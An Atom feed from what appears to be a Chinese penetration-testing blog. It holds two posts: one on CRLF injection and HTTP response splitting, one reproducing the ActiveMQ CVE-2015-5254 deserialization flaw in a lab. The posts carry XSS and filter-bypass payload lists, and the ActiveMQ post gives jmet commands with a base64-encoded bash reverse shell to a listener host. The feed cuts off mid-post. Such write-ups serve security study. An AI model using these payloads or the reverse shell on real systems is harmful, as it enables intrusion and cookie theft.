<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Demos&#39;s Blog</title>
  
  <subtitle>It&#39;s A Long Road</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.lsowl.top/"/>
  <updated>2019-11-09T15:09:02.159Z</updated>
  <id>https://www.lsowl.top/</id>
  
  <author>
    <name>Demos</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CRLF漏洞</title>
    <link href="https://www.lsowl.top/2019/11/09/CRLF%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.lsowl.top/2019/11/09/CRLF漏洞/</id>
    <published>2019-11-09T15:07:44.000Z</published>
    <updated>2019-11-09T15:09:02.159Z</updated>
    
    <content type="html"><![CDATA[<h3 id="CRLF背景"><a href="#CRLF背景" class="headerlink" title="CRLF背景"></a>CRLF背景</h3><p>CRLF是”回车 + 换行”（\r\n）的简称，指的是<strong>回车符</strong>(CR，ASCII 13，\r，%0d) 和<strong>换行符</strong>(LF，ASCII 10，\n，%0a)。 在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS(HTTP相应拆分漏洞）</p><h3 id="CRLF举例"><a href="#CRLF举例" class="headerlink" title="CRLF举例"></a>CRLF举例</h3><p>一般网站会在HTTP头中用Location: <a href="http://xxx.com这种方式来进行302跳转，所以我们能控制的内容就是Location:后面的XXX某个网址。" target="_blank" rel="noopener">http://xxx.com这种方式来进行302跳转，所以我们能控制的内容就是Location:后面的XXX某个网址。</a></p><p>正常的302跳转包如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">302</span> Moved Temporarily</span><br><span class="line"><span class="built_in">Date</span>: Fri, <span class="number">27</span> Jun <span class="number">2019</span> <span class="number">17</span>:<span class="number">52</span>:<span class="number">17</span> GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: <span class="number">154</span></span><br><span class="line">Connection: close</span><br><span class="line">Location: http:<span class="comment">//www.lsowl.top</span></span><br></pre></td></tr></table></figure><p>如果输入的是</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//www.lsowl.top%0aSet-cookie:JSPSESSID%3Dtest</span></span><br></pre></td></tr></table></figure><p>注入了一个换行，此时的返回包就会变成这样： </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">302</span> Moved Temporarily</span><br><span class="line"><span class="built_in">Date</span>: Fri, <span class="number">27</span> Jun <span class="number">2019</span> <span class="number">17</span>:<span class="number">52</span>:<span class="number">17</span> GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: <span class="number">154</span></span><br><span class="line">Connection: close</span><br><span class="line">Location: http:<span class="comment">//www.lsowl.top</span></span><br><span class="line"><span class="built_in">Set</span>-cookie: JSPSESSID=test</span><br></pre></td></tr></table></figure><p>此时就会产生会话固定漏洞， HRS并不仅限于会话固定，通过注入两个CRLF就能造成一个无视浏览器Filter的反射型XSS。</p><p>例如：一个网站进行URL跳转的参数链接如下 <a href="http://www.lsowl.top/?url=xxx，xxx放在Location后面作为一个跳转。如果我们输入的是">http://www.lsowl.top/?url=xxx，xxx放在Location后面作为一个跳转。如果我们输入的是</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//www.lsowl.top/?url=%0d%0a%0d%0a&lt;img src=1 onerror=alert(/xss/)&gt;</span></span><br></pre></td></tr></table></figure><p>返回包会变成如下的样子</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">302</span> Moved Temporarily</span><br><span class="line"><span class="built_in">Date</span>: Fri, <span class="number">27</span> Jun <span class="number">2019</span> <span class="number">17</span>:<span class="number">52</span>:<span class="number">17</span> GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: <span class="number">154</span></span><br><span class="line">Connection: close</span><br><span class="line">Location:</span><br><span class="line">&lt;img src=<span class="number">1</span> onerror=alert(<span class="regexp">/xss/</span>)&gt;</span><br></pre></td></tr></table></figure><p>这样浏览器会根据第一个 CRLF把HTTP包分成头和体，然后将体显示出来就会构造成一个XSS</p><p>还可以输入</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">0</span>d%<span class="number">0</span>aContent-Length:%<span class="number">200</span>%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>aHTTP/<span class="number">1.1</span>%<span class="number">20200</span>%<span class="number">20</span>OK%<span class="number">0</span>d%<span class="number">0</span>aContent-Type:%<span class="number">20</span>text/html%<span class="number">0</span>d%<span class="number">0</span>aContent-Length:%<span class="number">2047</span>%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a&lt;script&gt;alert(<span class="number">1</span>)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p> <code>Content-Length：0</code> 代表header 的结尾，返回包会变成这个样子 </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Encoding: deflate</span><br><span class="line">xxxxxxxx</span><br><span class="line">Locations=https:<span class="comment">//baidu.com</span></span><br><span class="line">Content-Length: <span class="number">0</span></span><br><span class="line">&lt;script&gt;alert(<span class="number">1</span>)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>触发漏洞</p><h3 id="CRLF绕过浏览器xss-filte"><a href="#CRLF绕过浏览器xss-filte" class="headerlink" title="CRLF绕过浏览器xss-filte"></a>CRLF绕过浏览器xss-filte</h3><p>浏览器的Filter是浏览器应对一些反射型XSS做的保护策略，当url中含有XSS相关特征的时候就会过滤掉不显示在页面中，所以不能触发XSS。 关掉filter？一般来说用户这边是不行的，只有数据包中http头含有X-XSS-Protection并且值为0的时候，浏览器才不会开启filter。</p><p>所以在绕过时只需要将 X-XSS-Protection:0注入到数据包中，再用两个CRLF来注入XSS代码，这样就成功地绕过了浏览器filter，并且执行我们的反射型XSS。</p><h3 id="CRLF挖掘"><a href="#CRLF挖掘" class="headerlink" title="CRLF挖掘"></a>CRLF挖掘</h3><p>通过修改HTTP参数或URL，注入恶意的CRLF，查看构造的恶意数据是否在响应头中输出。 注意输入点和输出点， 提交%0D%0A字符，验证服务器是否响应%0D%0A，若过滤可以通过双重编码绕过 ， 漏洞利用，使杀伤最大化，将漏洞转化为HTML注入，XSS等。 </p><h3 id="CRLF案例"><a href="#CRLF案例" class="headerlink" title="CRLF案例"></a>CRLF案例</h3><h4 id="案例一"><a href="#案例一" class="headerlink" title="案例一"></a>案例一</h4><p>实际中没有碰见过，这里贴P牛以前的实例</p><p>新浪某分站含有一个url跳转漏洞+CRLF</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//xxx.sina.com.cn/?url=%0a%0d%0a%0d%3Cimg%20src=1%3E</span></span><br></pre></td></tr></table></figure><p>加入 CRLF Injection 时注入成功， 图片已经输出在页面中</p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573270515.32.png" alt></p><p>测试XSS</p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573270559.83.png" alt></p><p>查看控制台，被XSS Filter拦截，此时注入<code>X-XSS-Protection:0</code></p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573270619.59.png" alt></p><p>用字符编码来绕过XSS Filter，当编码是is-2022-kr时浏览器会忽略%0f，这样我们在onerror后面加个%0f就能绕过filter，前提是注入一个 <code>&lt;meta charset=ISO-2022-KR&gt;</code></p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573270680.5.png" alt></p><h4 id="案例二"><a href="#案例二" class="headerlink" title="案例二"></a>案例二</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">GET /charts/total-bitcoins?cors=<span class="literal">true</span>&amp;format=csv&amp;lang=english HTTP/<span class="number">1.1</span></span><br><span class="line">Host: api.blockchain.info</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Macintosh; Intel Mac OS X <span class="number">10.12</span>; rv:<span class="number">55.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">55.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: en-US,en;q=0.5</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate, br</span></span><br><span class="line"><span class="comment">Connection: keep-alive</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment">HTTP/2.0 200 OK</span></span><br><span class="line"><span class="comment">date: Tue, 31 Oct 2017 15:47:21 GMT</span></span><br><span class="line"><span class="comment">content-type: text/csv; charset=ascii</span></span><br><span class="line"><span class="comment">content-length: 10953</span></span><br><span class="line"><span class="comment">access-control-allow-origin: *</span></span><br><span class="line"><span class="comment">cache-control: public, max-age=60</span></span><br><span class="line"><span class="comment">content-disposition: attachment; filename="total-bitcoins.csv"</span></span><br><span class="line"><span class="comment">content-language: english</span></span><br><span class="line"><span class="comment">"lang"参数出现在了返回包里</span></span><br><span class="line"><span class="comment">现在为了注入CRLF 我们需要url编码一下\r\n "%0D%0A"</span></span><br><span class="line"><span class="comment">据此发送如下请求</span></span><br><span class="line"><span class="comment">https://api2.blockchain.info/charts/total-bitcoins?cors=true&amp;format=csv&amp;lang=en%0ATEST</span></span><br><span class="line"><span class="comment">新的header出现在了返回包里</span></span><br><span class="line"><span class="comment">这里存在CRLF注入漏洞 ，这样可以进行利用CRLF漏洞去执行JavaScript代码，去盗取cookie</span></span><br><span class="line"><span class="comment">最终的Payload</span></span><br><span class="line"><span class="comment">https://api2.blockchain.info/charts/total-bitcoins?cors=true&amp;format=csv&amp;lang=en%0AX-XSS-Protection:0%0AContent-Type:text/html%0AContent-Length:35%0A%0A%3Csvg%20onload%3Dalert%28document.domain%29%3E&amp;__cf_waf_tk__=012853002E6loVIOSyqHfdxrvHJ87MshEnZI</span></span><br></pre></td></tr></table></figure><h3 id="CRLF修复"><a href="#CRLF修复" class="headerlink" title="CRLF修复"></a>CRLF修复</h3><p>修复HRS漏洞，过滤\r 、\n之类的换行符，避免输入的数据污染到其他HTTP头。</p><h3 id="CRLF-PAYLOAD"><a href="#CRLF-PAYLOAD" class="headerlink" title="CRLF-PAYLOAD"></a>CRLF-PAYLOAD</h3><h4 id="探测漏洞"><a href="#探测漏洞" class="headerlink" title="探测漏洞"></a>探测漏洞</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">0</span>d%<span class="number">0</span>aheader:header</span><br><span class="line"></span><br><span class="line">%<span class="number">0</span>aheader:header</span><br><span class="line"></span><br><span class="line">%<span class="number">0</span>dheader:header</span><br><span class="line"></span><br><span class="line">%<span class="number">23</span>%<span class="number">0</span>dheader:header</span><br><span class="line"></span><br><span class="line">%<span class="number">3</span>f%<span class="number">0</span>dheader:header</span><br><span class="line"></span><br><span class="line">/%<span class="number">250</span>aheader:header</span><br><span class="line"></span><br><span class="line">/%<span class="number">250</span>aheader:header</span><br><span class="line"></span><br><span class="line">/%%<span class="number">0</span>a0aheader:header</span><br><span class="line"></span><br><span class="line">/%<span class="number">3</span>f%<span class="number">0</span>dheader:header</span><br><span class="line"></span><br><span class="line">/%<span class="number">23</span>%<span class="number">0</span>dheader:header</span><br><span class="line"></span><br><span class="line">/%<span class="number">25</span>%<span class="number">30</span>aheader:header</span><br><span class="line"></span><br><span class="line">/%<span class="number">25</span>%<span class="number">30</span>%<span class="number">61</span>header:header</span><br><span class="line"></span><br><span class="line">/%u000aheader:header</span><br></pre></td></tr></table></figure><h4 id="开放重定向"><a href="#开放重定向" class="headerlink" title="开放重定向"></a><strong>开放重定向</strong></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/www.google.com/%<span class="number">2</span>f%<span class="number">2</span>e%<span class="number">2</span>e%<span class="number">0</span>d%<span class="number">0</span>aheader:header</span><br></pre></td></tr></table></figure><h4 id="CRLF-XSS"><a href="#CRLF-XSS" class="headerlink" title="CRLF-XSS"></a><strong>CRLF-XSS</strong></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">0</span>d%<span class="number">0</span>aContent-Length:<span class="number">35</span>%<span class="number">0</span>d%<span class="number">0</span>aX-XSS-Protection:<span class="number">0</span>%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a23%<span class="number">0</span>d%<span class="number">0</span>a&lt;svg%<span class="number">20</span>onload=alert(<span class="built_in">document</span>.domain)&gt;%<span class="number">0</span>d%<span class="number">0</span>a0%<span class="number">0</span>d%<span class="number">0</span>a/%<span class="number">2</span>e%<span class="number">2</span>e</span><br></pre></td></tr></table></figure><h4 id="XSS绕过"><a href="#XSS绕过" class="headerlink" title="XSS绕过"></a><strong>XSS绕过</strong></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">2</span>Fxxx:<span class="number">1</span>%<span class="number">2</span>F%<span class="number">0</span>aX-XSS-Protection:<span class="number">0</span>%<span class="number">0</span>aContent-Type:text/html%<span class="number">0</span>aContent-Length:<span class="number">39</span>%<span class="number">0</span>a%<span class="number">0</span>a%<span class="number">3</span>cscript%<span class="number">3</span>ealert(<span class="built_in">document</span>.cookie)%<span class="number">3</span>c/</span><br></pre></td></tr></table></figure><p><strong>Location</strong> </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">0</span>d%<span class="number">0</span>aContent-Type:%<span class="number">20</span>text%<span class="number">2</span>fhtml%<span class="number">0</span>d%<span class="number">0</span>aHTTP%<span class="number">2</span>f1<span class="number">.1</span>%<span class="number">20200</span>%<span class="number">20</span>OK%<span class="number">0</span>d%<span class="number">0</span>aContent-Type:%<span class="number">20</span>text%<span class="number">2</span>fhtml%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">3</span>Cscript%<span class="number">3</span>Ealert(<span class="string">'XSS'</span>);%<span class="number">3</span>C%<span class="number">2</span>fscript%<span class="number">3</span>E</span><br></pre></td></tr></table></figure><h4 id="其它一些FUZZ的payload"><a href="#其它一些FUZZ的payload" class="headerlink" title="其它一些FUZZ的payload"></a>其它一些FUZZ的payload</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">0</span>d%<span class="number">0</span>a</span><br><span class="line">%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a</span><br><span class="line">r%<span class="number">0</span>d%<span class="number">0</span>aContentLength:%<span class="number">200</span>%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>aHTTP/<span class="number">1.1</span>%<span class="number">20200</span>%<span class="number">20</span>OK%<span class="number">0</span>d%<span class="number">0</span>aContentType:%<span class="number">20</span>text/html%<span class="number">0</span>d%<span class="number">0</span>aContentLength:%<span class="number">2019</span>%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a&lt;html&gt;Injected%<span class="number">02</span>Content&lt;<span class="regexp">/html&gt;</span></span><br><span class="line"><span class="regexp">%0d%0d%0a%0a</span></span><br><span class="line"><span class="regexp">0x0D0x0A</span></span><br><span class="line"><span class="regexp">0x0D0x0D0x0A0x0A</span></span><br><span class="line"><span class="regexp">\r\n</span></span><br><span class="line"><span class="regexp">%5cr%5cn</span></span><br><span class="line"><span class="regexp">%0%0d%0ad%0%0d%0aa</span></span><br><span class="line"><span class="regexp">%0%0D%0AD%0%0D%0AA</span></span><br><span class="line"><span class="regexp">%0d%0aContentType:%20text/</span>html;charset=UTF<span class="number">-7</span>%<span class="number">0</span>d%<span class="number">0</span>aContent-Length:%<span class="number">20129</span>%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">2</span>BADw-html%<span class="number">2</span>BAD4-%<span class="number">2</span>BADw-body%<span class="number">2</span>BAD4-%<span class="number">2</span>BADw-script%<span class="number">2</span>BAD4-alert%<span class="number">28</span>%<span class="number">27</span>XSS,<span class="attr">cookies</span>:%<span class="number">27</span>%<span class="number">2</span>Bdocument.cookie%<span class="number">29</span>%<span class="number">2</span>BADw-<span class="regexp">/script%2BAD4-%2BADw-/</span>body%<span class="number">2</span>BAD4-%<span class="number">2</span>BADw-<span class="regexp">/html%2BAD4</span></span><br><span class="line"><span class="regexp">%0AContent-Type:html%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/</span>script%<span class="number">3</span>E</span><br><span class="line">%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">3</span>Cscript%<span class="number">3</span>Ealert(%<span class="number">22</span>XSS%<span class="number">22</span>)%<span class="number">3</span>C/script%<span class="number">3</span>E</span><br><span class="line">%<span class="number">0</span>AContent-Type:html%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">3</span>Cscript%<span class="number">3</span>Ealert(%<span class="number">22</span>XSS%<span class="number">22</span>)%<span class="number">3</span>C/script%<span class="number">3</span>Ehttp:<span class="comment">//www.test.com</span></span><br><span class="line">%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">3</span>Chtml%<span class="number">3</span>E%<span class="number">3</span>Cbody%<span class="number">3</span>E%<span class="number">3</span>C%<span class="number">2</span>Fbody%<span class="number">3</span>E%<span class="number">3</span>Cscript+src%<span class="number">3</span>Dhttp%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>Fha.ckers.org%<span class="number">2</span>Fs.js%<span class="number">3</span>E%<span class="number">3</span>C%<span class="number">2</span>Fscript%<span class="number">3</span>E%<span class="number">3</span>Cscript%<span class="number">3</span>Ealert(%<span class="number">22</span>location.host%<span class="number">20</span>is:%<span class="number">20</span>%<span class="number">22</span>%<span class="number">2</span>Blocation.host)%<span class="number">3</span>C%<span class="number">2</span>Fscript%<span class="number">3</span>E%<span class="number">3</span>C%<span class="number">2</span>Fhtml%<span class="number">3</span>E</span><br><span class="line">%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">3</span>Cscript+src%<span class="number">3</span>Dhttp%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>Fha.ckers.org%<span class="number">2</span>Fxss.js%<span class="number">3</span>E%<span class="number">3</span>C%<span class="number">2</span>Fscript%<span class="number">3</span>E</span><br><span class="line">%<span class="number">22</span>%<span class="number">3</span>E%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">3</span>Cscript%<span class="number">3</span>Ealert(%<span class="number">22</span>XSS%<span class="number">22</span>)%<span class="number">3</span>C/script%<span class="number">3</span>E%<span class="number">3</span>C%<span class="number">22</span></span><br><span class="line">%<span class="number">0</span>AContent-type:%<span class="number">20</span>text/html%<span class="number">0</span>A%<span class="number">0</span>Ahttp:<span class="comment">//www.test.com/%3Cscript%3Ealert(%22XSS%22)%3C/script%3E</span></span><br><span class="line">%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">3</span>Cscript%<span class="number">3</span>Ealert(%<span class="number">22</span>XSS%<span class="number">22</span>)%<span class="number">3</span>C%<span class="number">2</span>Fscript%<span class="number">3</span>E</span><br><span class="line">%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">3</span>Cscript%<span class="number">3</span>Ealert(%<span class="number">22</span>XSS%<span class="number">22</span>)%<span class="number">3</span>C/script%<span class="number">3</span>E</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://www.anquan.us/static/drops/papers-2466.html" target="_blank" rel="noopener">http://www.anquan.us/static/drops/papers-2466.html</a></p><p><a href="https://cloud.tencent.com/developer/article/1516335" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1516335</a> </p><p><a href="https://c1h2e1.github.io/#" target="_blank" rel="noopener">https://c1h2e1.github.io/#</a> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;CRLF背景&quot;&gt;&lt;a href=&quot;#CRLF背景&quot; class=&quot;headerlink&quot; title=&quot;CRLF背景&quot;&gt;&lt;/a&gt;CRLF背景&lt;/h3&gt;&lt;p&gt;CRLF是”回车 + 换行”（\r\n）的简称，指的是&lt;strong&gt;回车符&lt;/strong&gt;(CR，ASC
      
    
    </summary>
    
      <category term="渗透测试" scheme="https://www.lsowl.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="CRLF" scheme="https://www.lsowl.top/tags/CRLF/"/>
    
      <category term="HTTP相应拆分漏洞" scheme="https://www.lsowl.top/tags/HTTP%E7%9B%B8%E5%BA%94%E6%8B%86%E5%88%86%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="渗透测试" scheme="https://www.lsowl.top/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>ActiveMQ系列漏洞复现总结</title>
    <link href="https://www.lsowl.top/2019/11/09/ActiveMQ%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E6%80%BB%E7%BB%93/"/>
    <id>https://www.lsowl.top/2019/11/09/ActiveMQ系列漏洞复现总结/</id>
    <published>2019-11-08T16:01:39.000Z</published>
    <updated>2019-11-08T16:03:52.662Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ActiveMQ介绍"><a href="#ActiveMQ介绍" class="headerlink" title="ActiveMQ介绍"></a>ActiveMQ介绍</h2><p>Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务、集群、Spring Framework等。</p><h2 id="ActiveMQ-反序列化漏洞（CVE-2015-5254）"><a href="#ActiveMQ-反序列化漏洞（CVE-2015-5254）" class="headerlink" title="ActiveMQ 反序列化漏洞（CVE-2015-5254）"></a>ActiveMQ 反序列化漏洞（CVE-2015-5254）</h2><p>Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。</p><h3 id="运行环境"><a href="#运行环境" class="headerlink" title="运行环境"></a>运行环境</h3><p>vulhub</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker-compose up -d</span><br></pre></td></tr></table></figure><p>环境运行后，将监听61616和8161两个端口。其中61616是工作端口，消息在这个端口进行传递；8161是Web管理页面端口。访问<code>http://your-ip:8161</code>即可看到web管理页面，不过这个漏洞理论上是不需要web的。 所以ActiveMQ 反序列化漏洞存在得前提是开放了61616是工作端口，这样才可以收到JMS消息。</p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573052136.97.png" alt></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><ol><li>构造（可以使用ysoserial）可执行命令的序列化对象</li><li>作为一个消息，发送给目标61616端口</li><li>访问web管理页面，读取消息，触发漏洞（vulhub的web管理页面账号密码:admin/admin）</li></ol><p>使用<a href="https://github.com/matthiaskaiser/jmet" target="_blank" rel="noopener">jmet</a>进行漏洞利用。首先下载jmet的jar文件，并在同目录下创建一个external文件夹（否则可能会爆文件夹不存在的错误）。</p><p>jmet原理是使用ysoserial生成Payload并发送（其jar内自带ysoserial，无需再自己下载），所以我们需要在ysoserial是gadget中选择一个可以使用的，比如ROME</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-<span class="number">0.1</span>.0-all.jar -Q event -I ActiveMQ -s -Y <span class="string">"touch /tmp/success"</span> -Yp ROME your-ip <span class="number">61616</span></span><br></pre></td></tr></table></figure><blockquote><p> emmm,ysoserial不会用，留个坑后面补上</p></blockquote><p><strong>执行payload,在目标主机中得tmp目录下生成文件</strong>（event是JMS消息的名称）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-<span class="number">0.1</span>.0-all.jar -Q event -I ActiveMQ -s -Y <span class="string">"touch /tmp/4.txt"</span> -Yp ROME <span class="number">192.168</span>.1.103 <span class="number">61616</span></span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573052552.19.png" alt></p><p><strong>在web界面读取消息、触发漏洞</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.1.103:8161/admin/browse.jsp?JMSDestination=event</span></span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573052687.45.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573052707.54.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573052738.38.png" alt></p><p><strong>反弹shell</strong></p><p>这里注意一个点，反弹shell时要将命令base64加密后发送，利用bash在目标机解密执行，在不加密的情况下执行命令不能反弹shell，不知道为啥。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.102/8888 0&gt;&amp;1             <span class="comment">#加密前</span></span><br><span class="line">YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAyLzg4ODggMD4mMQ==   <span class="comment">#加密后</span></span><br><span class="line"> </span><br><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y <span class="string">"bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAyLzg4ODggMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;"</span> -Yp ROME 192.168.1.103   61616                                         <span class="comment">#执行的命令</span></span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573053017.02.png" alt></p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573053093.94.png" alt></p><p><strong>本地监听端口</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span 